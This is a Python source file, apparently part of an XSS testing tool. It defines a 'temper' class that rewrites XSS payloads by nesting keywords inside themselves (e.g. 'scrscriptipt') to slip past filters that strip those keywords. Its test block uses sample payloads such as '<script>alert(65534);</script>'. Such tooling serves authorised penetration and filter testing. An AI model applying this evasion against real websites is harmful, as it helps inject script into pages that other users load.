# coding=utf-8
import re
import traceback
import random
from xss.temper.temper import Temper
from xss.setting import LIGHT_MODEL
from xss.setting import HEAVY_MODEL


class AddKeywords(Temper):

    def __init__(self):
        super(AddKeywords, self).__init__()
        self.keywords = super(AddKeywords, self).get_keywords()
        self.payload = None

    def temper(self, payload_set, model=LIGHT_MODEL, **kw):
        """
        随机位置增加关键字，一般用于绕过 replace(keywords, '')的情况
        eg: script->scrscriptipt
            img->iimgmg
        """
        temp_payload_set = payload_set
        if not isinstance(payload_set, set):
            payload_set = set()
            payload_set.add(temp_payload_set)
        payloads = set()
        for payload in payload_set:
            self.payload = payload
            temp_payload = payload
            payloads.add(payload)
            for keyword in self.keywords:
                if keyword in payload:
                    payloads.add(temp_payload.replace(keyword, self.add_rand_key(keyword, keyword)))
                    payload = payload.replace(keyword, self.add_rand_key(keyword, keyword))
                    payloads.add(payload)
        if model == LIGHT_MODEL:
            return_payload = payloads.pop()
            if return_payload != return_payload.upper():
                return payload
            else:
                return payloads.pop()
        return payloads

    def add_rand_key(self, str, key):
        """
        随机位置增加随机字符
        """
        str = list(str)
        random_index = int(random.random()*len(str))
        random_index = random_index + 1 if random_index == 0 else random_index
        str.insert(random_index, key)
        return "".join(str)

    def get_keyword_count(self):
        count = 0
        for keyword in self.keywords:
            if keyword in self.payload:
                count += 1
        return count


if __name__ == "__main__":
    payload = '<script>alert(65534);</script>'
    payload2 = 'javascript:alert(1)'
    payloads = set()
    payloads.add(payload)
    # payloads.add(payload2)
    print (AddKeywords().temper(payload2, number=5, ))
